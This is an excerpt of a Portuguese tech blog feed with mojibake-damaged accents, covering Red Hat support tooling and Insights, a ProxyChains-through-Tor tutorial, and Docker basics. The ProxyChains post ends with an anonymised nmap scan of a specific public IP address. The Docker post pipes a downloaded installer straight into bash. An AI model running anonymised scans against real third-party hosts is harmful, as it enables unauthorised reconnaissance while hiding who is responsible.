[user@host ~]$ redhat-support-tool Welcome to the Red Hat Support Tool. Command (? for help): opencase &amp;ndash;product=&amp;ldquo;Red Hat Enterprise Linux&amp;rdquo; &amp;ndash;version=&amp;ldquo;7.0&amp;rdquo; Please enter a summary (or &amp;lsquo;q&amp;rsquo; to exit): System fails to run without power Please enter a description (Ctrl-D on an empty line when complete): When the server is unplugged, the operating system fails to continue. 1 Urgent 2 High 3 Normal 4 Low Please select a severity (or &amp;lsquo;q&amp;rsquo; to exit): 4 Would you like to assign a case group to this case (y/N)? N Would see if there is a solution to this problem before opening a support case? (y/N) N Support case 01034421 has successfully been opened.
Se as op√ß√µes &amp;ndash;product e &amp;ndash;version n√£o forem especificadas, o redhat-support-tool fornece uma lista de alternativas para essas op√ß√µes.
[user@host ~]$ redhat-support-tool Welcome to the Red Hat Support Tool. Command (? for help): opencase Do you want to use the default product - &amp;ldquo;Red Hat Enterprise Linux&amp;rdquo; (y/N)?: y &amp;hellip;output omitted&amp;hellip; 29 7.4 30 7.5 31 7.6 32 8.0 Beta Please select a version (or &amp;lsquo;q&amp;rsquo; to exit): 32 Please enter a summary (or &amp;lsquo;q&amp;rsquo; to exit): yum fails to install apache Please enter a description (Ctrl-D on an empty line when complete): yum cannot find correct repo 1 Urgent 2 High 3 Normal 4 Low Please select a severity (or &amp;lsquo;q&amp;rsquo; to exit): 4 Would you like to use the default (Ungrouped Case) Case Group (y/N)? : y Would you like to see if there&amp;rsquo;s a solution to this problem before opening a support case? (y/N) N Support case 010355678 has successfully been opened.
Anexar informa√ß√µes de diagn√≥stico a um caso de suporte
A inclus√£o de informa√ß√µes de diagn√≥stico pode levar a uma resolu√ß√£o mais r√°pida. Anexe o sosreport quando o caso for aberto. O comando sosreport gera um arquivo tar compactado com informa√ß√µes de diagn√≥stico extra√≠das do sistema em execu√ß√£o. O redhat-support-tool solicitar√° a inclus√£o do arquivo compactado se este tiver sido criado anteriormente:
Please attach a SoS report to support case 01034421. Create a SoS report as the root user and execute the following command to attach the SoS report directly to the case: redhat-support-tool addattachment -c 01034421 path to sosreport
Would you like to attach a file to 01034421 at this time? (y/N) N Command (? for help):
Se n√£o houver um relat√≥rio SoS atual, um administrador poder√° gerar e anexar um posteriormente. Use o comando redhat-support-tool addattachment para anexar o relat√≥rio.
Casos de suporte tamb√©m podem ser visualizados, modificados e fechados pelo assinante:
Command (? for help): listcases
Type the number of the case to view or &amp;rsquo;e&amp;rsquo; to return to the previous menu. 1 [Waiting on Red Hat] System fails to run without power No more cases to display Select a Case: 1
Type the number of the section to view or &amp;rsquo;e&amp;rsquo; to return to the previous menu. 1 Case Details 2 Modify Case 3 Description 4 Recommendations 5 Get Attachment 6 Add Attachment 7 Add Comment End of options. Option: q
Select a Case: q
Command (? for help):q
[user@host ~]$ redhat-support-tool modifycase &amp;ndash;status=Closed 01034421 Successfully updated case 01034421 [user@host ~]$
A Ferramenta de Suporte da Red Hat tem capacidades avan√ßadas de an√°lise e diagn√≥stico de aplicativos. Usando arquivos principais de despejo de falha do kernel, o redhat-support-tool pode criar e extrair um backtrace. Um backtrace √© um relat√≥rio dos quadros de pilha ativos no ponto de um despejo de falha e fornece diagn√≥sticos no local. Uma das op√ß√µes do redhat-support-tool √© abrir um caso de suporte.
A ferramenta tamb√©m fornece a an√°lise do arquivo de log. Usando o comando analyze da ferramenta, arquivos de registro de v√°rios tipos, incluindo os do sistema operacional, JBoss, Python, Tomcat e oVirt, poder√£o ser analisados para reconhecer sintomas dos problemas. Os arquivos de log podem ser visualizados e diagnosticados individualmente. O fornecimento de an√°lises pr√©-processadas, em vez de dados brutos, como o despejo de mem√≥ria ou os arquivos de log, permite que os casos de suporte sejam abertos e disponibilizados para os engenheiros mais rapidamente. Juntar-se ao Red Hat Developer
Um outro recurso √∫til dispon√≠vel no Red Hat √© o Red Hat Developer. Hospedado em https://developer.redhat.com, esse programa fornece direitos de subscri√ß√£o ao software da Red Hat para fins de desenvolvimento, documenta√ß√£o e livros premium de nossos especialistas em microsservi√ßos, computa√ß√£o sem servidor, Kubernetes e Linux. Um blog, links para informa√ß√µes sobre os pr√≥ximos eventos e treinamentos e outros recursos de ajuda tamb√©m est√£o dispon√≠veis, bem como links para o Red Hat Customer Portal.
O registro √© gratuito e pode ser conclu√≠do em https://developer.redhat.com/register.
Detec√ß√£o e solu√ß√£o de problemas com o Red Hat Insights Objetivos
Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de usar o Red Hat Insights para analisar os servidores quanto a problemas, corrigi-los ou resolv√™-los e confirmar se a solu√ß√£o funcionou. Introdu√ß√£o ao Red Hat Insights
O Red Hat Insights √© uma ferramenta de an√°lise preditiva para ajudar voc√™ a identificar e corrigir amea√ßas √† seguran√ßa, desempenho, disponibilidade e estabilidade em sistemas que executam os produtos da Red Hat em sua infraestrutura. O Insights √© entregue como um software como servi√ßo (SaaS), para que voc√™ possa implant√°-lo e dimension√°-lo rapidamente, sem requisitos adicionais de infraestrutura. Al√©m disso, voc√™ pode aproveitar imediatamente as recomenda√ß√µes e atualiza√ß√µes mais recentes da Red Hat espec√≠ficas para seus sistemas implantados.
A Red Hat atualiza regularmente a base de conhecimentos usada pelo Insights, com base em riscos comuns de suporte, vulnerabilidades de seguran√ßa, configura√ß√µes inv√°lidas conhecidas e outros problemas identificados pela Red Hat. A√ß√µes para mitigar ou remediar esses problemas s√£o validadas e verificadas pela Red Hat. Esse suporte permite que voc√™ identifique, priorize e resolva problemas proativamente antes que eles se tornem um problema maior.
Para cada problema detectado, o Insights fornece estimativas do risco apresentado e recomenda√ß√µes sobre como atenuar ou remediar o problema. Essas recomenda√ß√µes podem fornecer materiais como os playbooks do Ansible ou instru√ß√µes passo a passo leg√≠veis para ajudar voc√™ a resolver o problema.
O Insights personaliza recomenda√ß√µes para cada sistema registrado no servi√ßo. Voc√™ instala cada sistema cliente com um agente que coleta metadados sobre a configura√ß√£o de tempo de execu√ß√£o do sistema. Esses dados s√£o um subconjunto do que voc√™ pode fornecer ao Suporte da Red Hat usando o comando sosreport para resolver um t√≠quete de suporte. Voc√™ pode limitar ou ocultar os dados que o cliente envia Isso bloqueia o funcionamento de algumas das regras anal√≠ticas, dependendo do que voc√™ limitar.
Quase imediatamente depois de registrar um servidor e concluir a sincroniza√ß√£o inicial de metadados do sistema, voc√™ poder√° ver seu servidor e todas as recomenda√ß√µes para ele no console do Insights no Red Hat Cloud Portal.
O Insights atualmente fornece an√°lises preditivas e recomenda√ß√µes para esses produtos da Red Hat:
Red Hat Enterprise Linux 6.4 e posteriores Red Hat Virtualization 4 e posteriores Red Hat OpenShift Container Platform Red Hat OpenStack Platform 7 e posteriores Descri√ß√£o da arquitetura do Insights
Quando voc√™ registra um sistema com o Insights, ele imediatamente envia metadados sobre sua configura√ß√£o atual para a plataforma Insights. Ap√≥s o registro, o sistema atualiza periodicamente os metadados fornecidos ao Insights. O sistema envia os metadados usando criptografia TLS para proteg√™-los em tr√¢nsito.
Quando o Insights recebe os dados, ele os analisa e exibe o resultado no console da web do Insights em https://cloud.redhat.com/insights.
insights-architecture.svg
Instala√ß√£o de clientes do Insights
O Insights est√° inclu√≠do no Red Hat Enterprise Linux 8 como parte da subscri√ß√£o. Vers√µes anteriores dos servidores do Red Hat Enterprise Linux exigem a instala√ß√£o do pacote insights-client no sistema. Importante
O pacote insights-client substitui o pacote redhat-access-insights a partir do Red Hat Enterprise Linux 7.5.
Se o seu sistema estiver registrado para direitos de software atrav√©s do servi√ßo Customer Portal Subscription Management, voc√™ poder√° ativar o Insights com um comando. Use o comando insights-client &amp;ndash;register para registrar o sistema.
[root@host ~]# insights-client &amp;ndash;register
O cliente do Insights atualiza periodicamente os metadados fornecidos ao Insights. Use o comando insights-client para atualizar os metadados do cliente a qualquer momento.
[root@host ~]# insights-client Starting to collect Insights data for host.example.com Uploading Insights data. Successfully uploaded report for host.example.com. View details about this system on cloud.redhat.com: https://cloud.redhat.com/insights/inventory/dc480efd-4782-417e-a496-cb33e23642f0
Registro de um sistema RHEL com o Insights
Para registrar um servidor do RHEL no Insights, o processo geral √© o seguinte:
Registre interativamente o sistema com o servi√ßo Red Hat Subscription Management. [root@host ~]# subscription-manager register --auto-attach Certifique-se de que o pacote insights-client est√° instalado no sistema. No RHEL 7, esse pacote est√° no canal rhel-7-server-rpms. Nota Esta etapa n√£o √© necess√°ria nos sistemas do Red Hat Enterprise Linux 8. [root@host ~]# yum install insights-client Use o comando insights-client --register para registrar o sistema com o servi√ßo Insights e fazer o upload dos metadados iniciais do sistema. [root@host ~]# insights-client --register Confirme se o sistema est√° vis√≠vel em Inventory no console da web do Insights em https://cloud.redhat.com/insights. insights-inventory.png
Navega√ß√£o no console do Insights
O Insights oferece uma fam√≠lia de servi√ßos que voc√™ acessa no console da web em https://cloud.redhat.com/insights. Detec√ß√£o de problemas de configura√ß√£o usando o servi√ßo Advisor
O servi√ßo Advisor relata os problemas de configura√ß√£o que afetam seus sistemas. Acesse o servi√ßo no menu Advisor ‚Üí Recommentations.
insights-advisor.png
Para cada regra, o Insights oferece informa√ß√µes adicionais para ajudar voc√™ a entender o problema, priorizar o trabalho para resolv√™-lo, determinar qual mitiga√ß√£o ou remedia√ß√£o est√° dispon√≠vel e automatizar sua resolu√ß√£o com o Playbook do Ansible. O Insights tamb√©m fornece links para artigos da base de conhecimentos no portal do cliente.
insights-advisor-details.png
O servi√ßo Advisor avalia o risco que um problema apresenta ao seu sistema em duas categorias.
Risco total
Indica o impacto do problema no seu sistema. Risco de mudan√ßa
Indica o impacto da a√ß√£o de corre√ß√£o no seu sistema. Por exemplo, talvez seja necess√°rio reiniciar o sistema. Avalia√ß√£o da seguran√ßa usando o servi√ßo Vulnerability
O servi√ßo Vulnerability relata vulnerabilidades e exposi√ß√µes comuns (CVEs, Common Vulnerabilities and Exposures) que afetam seus sistemas. Acesse o servi√ßo no menu Vulnerability ‚Üí CVEs.
insights-vulnerability.png
Para cada CVE, o Insights fornece informa√ß√µes adicionais e lista os sistemas expostos. Voc√™ pode clicar em Remediate para criar um Playbook do Ansible para corre√ß√£o.
insights-vulnerability-CVE.png
An√°lise da conformidade usando o servi√ßo Compliance
O servi√ßo Compliance analisa seus sistemas e relata seu n√≠vel de conformidade a uma pol√≠tica do OpenSCAP. O projeto OpenSCAP implementa ferramentas para verificar a conformidade de um sistema com um conjunto de regras. O Insights fornece as regras para avaliar seus sistemas em rela√ß√£o a diferentes pol√≠ticas, como o padr√£o de seguran√ßa de dados da ind√∫stria de pagamento com cart√£o (PCI DSS, Payment Card Industry Data Security Standard). Atualiza√ß√£o de pacotes usando o servi√ßo Patch
O servi√ßo Patch lista os avisos de produto da Red Hat aplic√°veis aos seus sistemas. Ele tamb√©m pode gerar um Playbook do Ansible que voc√™ possa executar para atualizar os pacotes RPM associados aos avisos aplic√°veis. Para acessar a lista de avisos de um sistema espec√≠fico, use o menu Patch ‚Üí Systems. Clique em Apply all applicable advisories para um sistema para gerar o Playbook Ansible.
insights-patch.png
Compara√ß√£o de sistemas usando o servi√ßo Drift
Usando o servi√ßo Drift, voc√™ pode comparar sistemas ou um hist√≥rico do sistema. Esse servi√ßo pode ajudar voc√™ a solucionar problemas de um sistema comparando esse sistema a um sistema semelhante ou a um estado anterior do sistema. Acesse o servi√ßo no menu Drift ‚Üí Comparison.
insights-drift.png
Gatilhos de alertas usando o servi√ßo Policies
Usando o servi√ßo Policies, voc√™ cria regras para monitorar seus sistemas e enviar alertas quando um sistema n√£o est√° de acordo com suas regras. O Insights avalia as regras toda vez que um sistema sincroniza seus metadados. Acesse o servi√ßo no menu Policies.
insights-policies.png
Acesso ao invent√°rio e aos Playbooks de corre√ß√£o e monitoramento de subscri√ß√µes
A p√°gina Inventory fornece uma lista dos sistemas que voc√™ registrou com o Red Hat Insights. A coluna Last seen exibe a hora da atualiza√ß√£o de metadados mais recente para cada sistema. Ao clicar em um nome de sistema, voc√™ pode revisar seus detalhes e acessar diretamente os servi√ßos Advisor, Vulnerability, Compliance e Patch desse sistema.
A p√°gina Remediations lista todos os Playbooks do Ansible que voc√™ criou para corre√ß√£o. Voc√™ pode fazer o download dos Playbooks nessa p√°gina.
Na p√°gina Subscription Watch, voc√™ pode monitorar o uso da subscri√ß√£o da Red Hat.
Cap√≠tulo 17. Revis√£o abrangente Revis√£o abrangente Objetivos
Depois de concluir esta se√ß√£o, os alunos dever√£o ter analisado e atualizado o conhecimento e as habilidades aprendidas em Red Hat System Administration I. Revis√£o de Red Hat System Administration I
Para iniciar a revis√£o abrangente deste curso, os alunos precisam estar familiarizados com os t√≥picos abordados em cada cap√≠tulo.
Os alunos podem consultar as se√ß√µes anteriores do material did√°tico para estudo adicional.
Cap√≠tulo 1, Introdu√ß√£o ao Red Hat Enterprise Linux
Descrever e definir open source, Linux, distribui√ß√µes do Linux e Red Hat Enterprise Linux.
Definir e explicar a finalidade do Linux, open source, distribui√ß√µes do Linux e Red Hat Enterprise Linux. Cap√≠tulo 2, Acesso √† linha de comando
Fa√ßa login em um sistema Linux e execute comandos simples utilizando o shell.
Fa√ßa login em um sistema Linux em um console de texto local e execute comandos simples utilizando o shell. Fa√ßa login em um sistema Linux usando o ambiente de √°rea de trabalho GNOME 3 e execute comandos a partir de um prompt do shell em um programa do terminal. Economize tempo usando o preenchimento com Tab, hist√≥rico de comandos e atalhos de edi√ß√£o de comandos para executar comandos no shell Bash. Cap√≠tulo 3, Gerenciamento de arquivos na linha de comando
Copie, mova, crie, exclua e organize arquivos trabalhando no shell Bash.
Descrever como o Linux organiza arquivos e os prop√≥sitos de v√°rios diret√≥rios na hierarquia do sistema de arquivos. Especificar o local dos arquivos relativos ao diret√≥rio de trabalho atual e por localiza√ß√£o absoluta, determinar e alterar seu diret√≥rio de trabalho e listar o conte√∫do dos diret√≥rios. Criar, copiar, mover e remover arquivos e diret√≥rios. Fazer com que v√°rios nomes de arquivos fa√ßam refer√™ncia ao mesmo arquivo usando links f√≠sicos e simb√≥licos (ou &amp;quot;soft&amp;quot;). Executar com efici√™ncia comandos que afetam muitos arquivos usando recursos de correspond√™ncia de padr√µes do shell Bash. Cap√≠tulo 4, Ajuda no Red Hat Enterprise Linux
Resolver problemas usando sistemas de ajuda locais.
Encontrar informa√ß√µes nas p√°ginas de manual do sistema Linux local. Encontrar informa√ß√µes da documenta√ß√£o local no GNU Info. Cap√≠tulo 5, Cria√ß√£o, visualiza√ß√£o e edi√ß√£o de arquivos de texto
Criar, visualizar e editar arquivos de texto na sa√≠da do comando ou em um editor de texto.
Salvar a sa√≠da do comando ou erros em um arquivo com redirecionamento de shell e processar a sa√≠da do comando por meio de v√°rios programas de linha de comando com pipes. Criara e editar arquivos de texto usando o editor vim. Usar vari√°veis shell para ajudar a executar comandos, e editar scripts de inicializa√ß√£o Bash para definir vari√°veis shell e de ambiente a fim de modificar o comportamento do shell e os programas executados a partir dele. Cap√≠tulo 6, Gerenciamento de usu√°rios e grupos locais
Criara, gerenciar e excluir usu√°rios e grupos locais do Linux e administrar pol√≠ticas de senha locais.
Descrever o objetivo dos usu√°rios e grupos em um sistema Linux. Alternar para a conta de superusu√°rio para gerenciar um sistema Linux e conceder acesso de superusu√°rio a outros usu√°rios usando o comando sudo. Criar, modificar e excluir contas de usu√°rio definidas localmente. Criar, modificar e excluir contas de grupo definidas localmente. Definir uma pol√≠tica de gerenciamento de senha para usu√°rios e bloquear e desbloquear manualmente contas de usu√°rio. Cap√≠tulo 7, Controle de acesso a arquivos
Configurar permiss√µes de sistema de arquivos Linux em arquivos e interpretar os efeitos na seguran√ßa de diferentes configura√ß√µes de permiss√µes.
Listar as permiss√µes do sistema de arquivos em arquivos e diret√≥rios e interpretar o efeito dessas permiss√µes no acesso de usu√°rios e grupos. Alterar as permiss√µes e a propriedade dos arquivos usando ferramentas de linha de comando. Controlar as permiss√µes padr√£o de novos arquivos criados pelos usu√°rios, explicar o efeito de permiss√µes especiais e usar permiss√µes especiais e permiss√µes padr√£o para definir o propriet√°rio do grupo de arquivos criado em um diret√≥rio espec√≠fico. Cap√≠tulo 8, Monitoramento e gerenciamento de processos do Linux
Avaliar e controlar os processos em execu√ß√£o em um sistema Red Hat Enterprise Linux.
Obter informa√ß√µes sobre programas em execu√ß√£o no sistema para poder determinar o status, o uso de recursos e a propriedade deles e para control√°-los. Usar controle de tarefa do Bash para gerenciar v√°rios processos iniciados na mesma sess√£o de terminal. Controlar e encerrar os processos que n√£o est√£o associados ao seu shell e for√ßar a conclus√£o das sess√µes e dos processos do usu√°rio. Descrever qual √© a m√©dia de carga e determinar os processos respons√°veis pelo uso elevado de recursos em um servidor. Cap√≠tulo 9, Controle de servi√ßos e daemons
Controlar e monitorar servi√ßos de rede e daemons do sistema utilizando Systemd.
Listar daemons do sistema e servi√ßos de rede iniciados pelo servi√ßo systemd e pelas unidades de soquete. Controlar daemons do sistema e dos servi√ßos de rede usando systemctl. Cap√≠tulo 10, Configura√ß√£o e prote√ß√£o do SSH
Configurar o servi√ßo seguro da linha de comando em sistemas remotos usando OpenSSH.
Fazer login em um sistema remoto e executar comandos usando ssh. Configurar autentica√ß√£o baseada em chave para uma conta de usu√°rio a fim de fazer login em sistemas remotos com seguran√ßa e sem uma senha. Restringir logins diretos como root e desativar a autentica√ß√£o baseada em senha para o servi√ßo OpenSSH. Cap√≠tulo 11, An√°lise e armazenamento de logs
Localizar e interpretar com precis√£o os logs de eventos do sistema para fins de solu√ß√£o de problemas.
Descrever a arquitetura b√°sica de registro em log usada pelo Red Hat Enterprise Linux para registrar eventos. Interpretar eventos em arquivos relevantes do syslog para solucionar problemas ou revisar o status do sistema. Localizar e interpretar entradas no di√°rio do sistema para solucionar problemas ou revisar o status do sistema. Configurar o di√°rio do sistema para manter o registro dos eventos quando um servidor for reinicializado. Manter a sincroniza√ß√£o de hor√°rio preciso usando NTP e configurar o fuso hor√°rio para garantir data e hora corretas nos eventos registrados pelos logs e pelo di√°rio do sistema. Cap√≠tulo 12, Gerenciamento de redes
Definir configura√ß√µes e interfaces de rede em servidores Red Hat Enterprise Linux.
Descrever os conceitos fundamentais de endere√ßamento e roteamento de redes de um servidor. Testar e inspecionar a configura√ß√£o atual da rede com utilit√°rios de linha de comando. Gerenciar configura√ß√µes e dispositivos de rede usando nmcli. Modificar as configura√ß√µes da rede editando os arquivos de configura√ß√£o. Configurar o nome do host est√°tico de um servidor e sua resolu√ß√£o de nome e testar os resultados. Cap√≠tulo 13, Arquivamento e transfer√™ncia de arquivos
Arquivar e copiar arquivos de um sistema para outro.
Arquivar arquivos e diret√≥rios em um arquivo compactado usando tar e extrair o conte√∫do de um arquivo compactado tar existente. Transferir arquivos a partir de um sistema remoto ou para ele usando seguran√ßa SSH. Sincronizar o conte√∫do de um arquivo ou diret√≥rio local com uma c√≥pia no servidor remoto. Cap√≠tulo 14, Instala√ß√£o e atualiza√ß√£o de pacotes de software
Baixar, instalar, atualizar e gerenciar os pacotes de software da Red Hat e os reposit√≥rios de pacotes YUM.
Registrar um sistema em sua conta da Red Hat e atribuir direitos a atualiza√ß√µes de software e servi√ßos de suporte usando o Red Hat Subscription Management. Explicar como o software √© fornecido como pacotes RPM e investigar os pacotes instalados no sistema com o YUM e o RPM. Encontrar, instalar e atualizar pacotes de software com o comando yum. Ativar e desativar o uso de reposit√≥rios YUM da Red Hat ou de terceiros por um servidor. Explicar como os m√≥dulos permitem a instala√ß√£o de vers√µes espec√≠ficas de software, listar, ativar e alternar fluxos de m√≥dulos, al√©m de instalar e atualizar os pacotes de um m√≥dulo. Cap√≠tulo 15, Acesso a sistemas de arquivos Linux
Acessar, inspecionar e usar os sistemas de arquivos existentes no armazenamento conectado a um servidor Linux.
Explicar o que √© um dispositivo de blocos, interpretar os nomes de arquivos dos dispositivos de armazenamento e identificar o dispositivo de armazenamento usado pelo sistema de arquivos para um diret√≥rio ou arquivo espec√≠fico. Acessar os sistemas de arquivos conectando-os a um diret√≥rio na hierarquia do sistema de arquivos. Procurar arquivos em sistemas de arquivos montados usando os comandos find e locate. Cap√≠tulo 16, An√°lise e obten√ß√£o de suporte
Investigar e resolver problemas na interface de gerenciamento baseada na web, obtendo suporte da Red Hat para ajudar a solucionar problemas.
Ativar a interface de gerenciamento do console da web para gerenciar e monitorar remotamente o desempenho de um servidor Red Hat Enterprise Linux. Descrever os principais recursos dispon√≠veis por meio do Red Hat Customer Portal e encontrar informa√ß√µes da documenta√ß√£o da Red Hat e da base de conhecimento. Analisar os servidores quanto a problemas, corrigir ou resolv√™-los e confirmar a solu√ß√£o com o Red Hat Insights. ]]></content:encoded>
    </item>
    <item>
      <title>Proxychain</title>
      <link>https://fxshelll.github.io/posts/proxychain/</link>
      <pubDate>Wed, 03 Feb 2021 14:49:14 UT</pubDate>
      <dc:creator>Felipe da Matta</dc:creator>
      <guid>https://fxshelll.github.io/posts/proxychain/</guid>
      <description>O ProxyChains √© um programa que trabalha em base UNIX, que conecta fun√ß√µes relacionadas √† rede em programas vinculados dinamicamente por meio de uma DLL pr√©-carregada e redireciona as conex√µes por meio de proxies SOCKS4 e SOCKS5 ou HTTP.
Ao inv√©s do Proxychains realizar o roteamento para uma lista espec√≠fica de proxys, podemos usar o Tor Router e redirecionar as requisi√ß√µes diretamente para a porta do Tor. Ou seja, iremos realizar varreduras diretamente pela Tor.</description>
      <content:encoded><![CDATA[O ProxyChains √© um programa que trabalha em base UNIX, que conecta fun√ß√µes relacionadas √† rede em programas vinculados dinamicamente por meio de uma DLL pr√©-carregada e redireciona as conex√µes por meio de proxies SOCKS4 e SOCKS5 ou HTTP.
Ao inv√©s do Proxychains realizar o roteamento para uma lista espec√≠fica de proxys, podemos usar o Tor Router e redirecionar as requisi√ß√µes diretamente para a porta do Tor. Ou seja, iremos realizar varreduras diretamente pela Tor.
$ sudo apt-get install proxychains $ sudo apt-get install tor Dentro do arquivo de config do proxychains:
root@kali:~#: nano /etc/proxychains.conf Comentar a linha &amp;ldquo;strict_chain&amp;rdquo;
Descomentar a linha &amp;ldquo;dynamic_chain&amp;rdquo;
Explica√ß√£o r√°pida sobre eles:
Strict Chain
Strict Chain √© a op√ß√£o padr√£o em proxychains. Nesta op√ß√£o, todas as conex√µes passam pelos proxies na ordem listada no arquivo de configura√ß√£o. Strict Chain √© muito √∫til quando voc√™ deseja sua localiza√ß√£o e sabe que os proxies selecionados est√£o funcionando bem. Para usar Strict Chain, √© necess√°rio descomentar ‚Äústrict_chain‚Äù no arquivo de configura√ß√£o.
Dynamic Chain funciona da mesma maneira que uma Strict Chain, √© usado todos os proxies que est√£o no arquivo de configura√ß√£o, mas √© ignorado ou exclui os proxies da cadeia que est√° morta ou n√£o est√° funcionando no momento. Para usar uma Dynamic Chain, remova o coment√°rio de ‚ÄúDynamic_Chain‚Äù e comente ‚Äúrandom_chain‚Äù e ‚Äústrict_chain‚Äù no arquivo de configura√ß√£o.
Random Chain significa aleatoriedade, o que significa que todas as conex√µes passam por um proxy listado no seu arquivo de configura√ß√£o, mas aleatoriamente, ningu√©m adivinha quais proxies s√£o os pr√≥ximos. Para usar Random Chain, √© necess√°rio descomentar ‚Äúrandom_chain‚Äù e comentar ‚Äúdynamic chain‚Äù e ‚Äústrict_chain‚Äù no arquivo de configura√ß√£o.
Se voc√™ estiver usando o random_chain, descomente a linha ‚Äúchain_len‚Äù, que permite o encadeamento din√¢mico. Ele conecta um n√∫mero de endere√ßos IP na cadeia que s√£o gerados aleatoriamente a partir da sua lista de proxies.
Por padr√£o vem selecionado Strict Chain, por isso comentamos strict_chain e descomentamos dynamic_chain para que o proxychains trabalhe de forma dinamica.
E agora no final deste mesmo arquivo, vamos adicionar a linha:
socks5 127.0.0.1 9050
Inicializando o servi√ßo do tor root@kali:~#: service tor start root@kali:~#: service tor status Testando a Conex√£o Abra o Firefox ou Iceweasel e acesse a URL http://www.meuip.com.br/ para pegar o seu IP atual
root@kali:~#: proxychains firefox Agora acesse o &amp;lsquo;utrace&amp;rsquo; e coloque o IP do seu Proxy para saber a localiza√ß√£o do servidor que voc√™ est√° utilizando como Gateway em http://en.utrace.de/
Se estiver tudo certo, e ele te mostrar a origem do server, est√° pronto!
Agora quando for realizar alguma varredura √© s√≥ executar o comando com o proxychains na frente, utilizando o terminal digite proxychains &#43; [ aplica√ß√£o ]. O proxychains para tunelar o seu tr√°fego em qualquer aplica√ß√£o.
Realizando uma varredura via Proxychains root@kali:~#: proxychains nmap -sC -sS 177.126.175.230 ]]></content:encoded>
    </item>
    <item>
      <title>Docker</title>
      <link>https://fxshelll.github.io/posts/docker/</link>
      <pubDate>Thu, 08 Oct 2020 14:10:44 UT</pubDate>
      <dc:creator>Felipe da Matta</dc:creator>
      <guid>https://fxshelll.github.io/posts/docker/</guid>
      <description>Aprendizado baseado no curso do Linuxtips, do Jefferson. Apenas para conhecimento sem fins lucrativos postei aqui para o meu aprendizado pessoal.
Quando falamos de container, estamos falando de isolamento. Esse container est√° sendo executado dentro de um servidor, este fica completamente isolado da maquina. E dentro deste cercado eu tenho processos locais do container. Claro consigo ver os processos do meu host local, o servidor fisico que est√° rodando este container.</description>
      <content:encoded><![CDATA[Aprendizado baseado no curso do Linuxtips, do Jefferson. Apenas para conhecimento sem fins lucrativos postei aqui para o meu aprendizado pessoal.
Quando falamos de container, estamos falando de isolamento. Esse container est√° sendo executado dentro de um servidor, este fica completamente isolado da maquina. E dentro deste cercado eu tenho processos locais do container. Claro consigo ver os processos do meu host local, o servidor fisico que est√° rodando este container.
Duas formas de isolamento, l√≥gica e f√≠sica.
L√≥gica (namespaces): redes, usu√°rios, processos F√≠sica (Cgroups): CPU, memoria, disco.
#O que √© o Docker?
Todos as imagens em camadas s√£o read-only exceto a primeira camada ou seja a ultima √© alterada. Se eu tenho 5 Containers de 500mb rodando, n√£o ser√° 5GB de espa√ßo alocado no disco do servidor. Continuar√° sendo 500MB, pois ele usa a mesma imagem em todas as camadas.
O m√≥dulo do kernel Linux √© o respons√°vel por criar rotas, redirects e boa parte da tarefa de roteamento de pacotes para o Docker √© o Netfilter
O m√≥dulo do kernel Linux √© o respons√°vel pelo isolamento de recursos como CPU e mem√≥ria √© o Cgroups
O m√≥dulo do kernel Linux √© o respons√°vel pelo isolamento de processos, √© o namespaces
Instalando o Docker Comandos Utilizados:
curl -fsSL https://get.docker.com/ | bash docker version docker container ls a vers√£o paga do Docker √© a vers√£o Docker EE (enterprise)
Mas vamos utilizar a vers√£o CE, vers√£o gratuita.
osboxes@osboxes:~$ docker version Client: Docker Engine - Community Version: 19.03.13 API version: 1.40 Go version: go1.13.15 Git commit: 4484c46d9d Built: Wed Sep 16 17:02:52 2020 OS/Arch: linux/amd64 Experimental: false Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.40/version: dial unix /var/run/docker.sock: connect: permission denied #Executando e administrando containers Docker
A primeira coisa a se fazer √© o famoso hello-word
Algo como:
#$ docker container run hello-world
root@osboxes:~# docker container run hello-world Hello from Docker! This message shows that your installation appears to be working correctly. To generate this message, Docker took the following steps: 1. The Docker client contacted the Docker daemon. 2. The Docker daemon pulled the &amp;#34;hello-world&amp;#34; image from the Docker Hub. (amd64) 3. The Docker daemon created a new container from that image which runs the executable that produces the output you are currently reading. 4. The Docker daemon streamed that output to the Docker client, which sent it to your terminal. To try something more ambitious, you can run an Ubuntu container with: $ docker run -it ubuntu bash Share images, automate workflows, and more with a free Docker ID: https://hub.docker.com/ For more examples and ideas, visit: https://docs.docker.com/get-started/ Para visualizar todos os containers que est√£o em execu√ß√£o, parados ou mortos, eu utilizo o comando:
#$ docker container ls -a
root@osboxes:~# docker container ls -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES fc4253022db8 hello-world &amp;#34;/hello&amp;#34; 36 seconds ago Exited (0) 34 seconds ago reverent_neumann 106fbfd9aba4 hello-world &amp;#34;/hello&amp;#34; 8 minutes ago Exited (0) 8 minutes ago hungry_kapitsa Outra coisa interessante √© usar o comando -ti para cair dentro do container que acabou de subir, ou seja eu quero um terminal com interatividade, no caso seria algo como:
root@osboxes:~# docker container run -ti ubuntu Unable to find image &amp;#39;ubuntu:latest&amp;#39; locally latest: Pulling from library/ubuntu d72e567cc804: Pull complete 0f3630e5ff08: Pull complete b6a83d81d1f4: Pull complete Digest: sha256:bc2f7250f69267c9c6b66d7b6a81a54d3878bb85f1ebb5f951c896d13e6ba537 Status: Downloaded newer image for ubuntu:latest root@2fd8c26be92e:/# Perceba que j√° est√° dentro do ubuntu que subiu, vamos ver os processos dele agora:
root@2fd8c26be92e:/# ps -ef UID PID PPID C STIME TTY TIME CMD root 1 0 0 17:15 pts/0 00:00:00 /bin/bash root 8 1 0 17:17 pts/0 00:00:00 ps -ef Se eu der um CTRL&#43;D eu saiu do container criado e ele morre.
Todo container tem um entrypoint, neste caso √© o pr√≥prio bash, ent√£o quando saimos dele, ele √© finalizado tamb√©m.
root@osboxes:~# docker container run -ti centos Unable to find image &amp;#39;centos:latest&amp;#39; locally latest: Pulling from library/centos 3c72a8ed6814: Pull complete Digest: sha256:76d24f3ba3317fa945743bb3746fbaf3a0b752f10b10376960de01da70685fbd Status: Downloaded newer image for centos:latest [root@ca53ed399c0d /]# Agora subi um CentOS, e j√° estou dentro dele.
[root@ca53ed399c0d /]# cat /etc/redhat-release CentOS Linux release 8.2.2004 (Core) Se eu quero sair do container mas sem matar o container, eu digito ctrl&#43;p&#43;q quando eu volto para o meu host, posso visualizar que ela ainda est√° rodando.
